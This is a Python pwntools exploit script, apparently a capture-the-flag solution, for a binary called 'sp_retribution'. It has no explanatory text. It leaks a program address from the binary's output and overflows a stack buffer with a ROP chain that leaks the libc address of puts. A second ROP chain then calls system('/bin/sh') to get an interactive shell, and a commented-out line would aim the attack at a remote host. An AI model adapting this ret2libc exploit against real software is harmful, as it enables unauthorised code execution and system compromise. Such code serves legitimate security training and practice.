from pwn import *
from pprint import pprint

debug = lambda x: None
def debug(x): print(x)

### PwnTools Setup #################################################
context(os="linux", arch="amd64")
elf = context.binary = ELF("sp_retribution") #ELF("challenge/sp_retribution")
libc = ELF("glibc/libc.so.6")
rop = ROP(elf)
#pprint(elf.symbols)

### 5: Exploit ######################################################

import os
import time

def overflow(ropchain):
    prefix = ""
    offset = 80
    overflow = "A" * offset
    rbp = "A" * 8
    #retn = "" 
    #padding = "" #+ "\xcc"
    postfix = "\n"
    #buffer = overflow + rbp + retn + padding + payload + postfix
    buffer = overflow + rbp + ropchain #+ postfix
    return buffer


### Running Program ###########################################
io = process("./sp_retribution")
#io = remote(raw_input("RHOST: ").strip(), input("RPORT:"))

debug(io.recv())
io.send("2")
debug(io.recv())
io.send("\n")
print("### Processing Output ########################")
data = io.recv()
debug(data)
debug(data.split('\n'))

vuln = '\n' + data.split('\n')[2] 
debug([vuln])

### Calculation ##############################
def hex_vis(vuln, prefix="\\x"):
    out = ""
    for character in vuln:
        #print(character, character.encode('hex'))
        out = prefix + character.encode('hex') + out
    return out

def hex_vis_2(vuln):
    return "0x"+hex_vis(vuln, "")

debug(hex_vis(vuln))
out = hex_vis_2(vuln)
debug(out)

offset = 0x0d0a
address_found = eval(out)
address_base = address_found - offset
debug(hex_vis(p64(address_base)))
address_main = address_base + elf.symbols['main']
debug(hex_vis(p64(address_main)))

### Generating ROPChain ########################################

def ropchain_overflow(chain, address_base):
    chain_payload = ""
    for link in chain:
        #print(link)
        if type(link) != tuple:
            offset = link
            new_address = address_base + offset
        elif type(link) == tuple:
            offset = link[0]
            new_address = link[1] + offset
        chain_payload += p64(new_address)
        #print("Address:", hex_vis_2(p64(offset)), "->", hex_vis_2(p64(new_address)))

    return overflow(chain_payload)

#print("Hex: " + hex_vis_2(p64(elf.got.puts)))

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
io.send(ropchain_overflow([
    pop_rdi, 
    elf.got.puts,
    elf.plt.puts,
    elf.symbols['main'],
    elf.symbols['show_missiles']
], address_base))

data = io.recv().split('\n')
puts_leak = eval(hex_vis_2(data[2]))
print(hex_vis_2(data[2]))


#io.interactive()
### Going back to overflow #################################
io.send("2")
debug(io.recv())
io.send("\n")
debug(io.recv())

### ROPChain 2 ##############################################
libc.address = puts_leak - libc.sym["puts"]
SYSTEM = libc.sym["system"]
BINSH = next(libc.search("/bin/sh")) 

log.info("libc: %s " % hex(libc.address))
log.info("bin/sh: %s " % hex(BINSH))
log.info("system: %s " % hex(SYSTEM))

#time.sleep(10)

io.send(ropchain_overflow([
    rop.find_gadget(["ret"])[0],
    rop.find_gadget(["pop rdi", "ret"])[0], 
    (BINSH, 0), 
    (SYSTEM, 0), 
    #elf.symbols['main'],
], address_base))

io.interactive()

